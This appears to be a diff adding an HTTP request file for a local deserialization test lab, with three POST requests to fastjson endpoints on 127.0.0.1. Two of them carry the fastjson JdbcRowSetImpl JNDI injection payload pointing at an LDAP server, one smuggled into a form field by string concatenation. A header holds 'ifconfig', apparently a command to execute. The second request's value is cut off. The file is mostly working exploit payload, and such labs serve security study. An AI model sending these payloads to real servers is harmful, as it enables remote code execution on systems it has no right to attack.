@@ -1,0 +1,41 @@
+###
+# fastjson 原封不动
+POST /deserialization/fastjson/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: ifconfig
+Content-Type: application/json
+
+
+{
+  "a":{
+    "@type":"java.lang.Class",
+    "val":"com.sun.rowset.JdbcRowSetImpl"
+  },
+  "b":{
+    "@type":"com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName":"ldap://127.0.0.1:1389/0mghfs",
+    "autoCommit":true
+  }
+}
+
+
+###
+# 对象赋值 value
+POST /deserialization/fastjson/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: ifconfig
+Content-Type: application/x-www-form-urlencoded
+
+
+value="
+
+
+###
+# String.format 字符替换
+POST /deserialization/fastjson/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: ifconfig
+Content-Type: application/x-www-form-urlencoded
+
+
+value=","abc":{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/0mghfs","autoCommit":true}},"abcd":"
